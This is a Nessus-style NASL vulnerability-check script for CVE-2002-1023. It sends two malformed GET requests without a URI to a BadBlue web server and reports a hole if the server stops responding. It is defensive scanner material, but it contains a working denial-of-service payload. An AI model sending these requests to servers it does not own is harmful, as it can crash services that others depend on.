#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#

if(description)
{
 script_id(11062);
 script_bugtraq_id(5187);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2002-1023");
 name["english"] = "BadBlue invalid GET DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid GET request (without any URI)

A cracker may exploit this vulnerability to make your web server
crash continually.

Workaround : upgrade your software or protect it with a filtering reverse proxy

Risk factor : Low";

 script_description(english:desc["english"]);
 
 summary["english"] = "Invalid GET kills the BadBlue web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes");
 exit(0);
}

########


include("http_func.inc");

r1 = string("GET HTTP/1.0\r\n\r\n");
r2 = string("GET  HTTP/1.0\r\n\r\n");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if(http_is_dead(port: port)) exit (0);

soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: r1);
r = http_recv(socket:soc);
close(soc);

sleep(1);

soc = http_open_socket(port);
if(!soc) { security_hole(port); exit(0); }
send(socket:soc, data: r2);
r = http_recv(socket:soc);
http_close_socket(soc);

sleep(1);

if(http_is_dead(port: port)) { security_hole(port); }
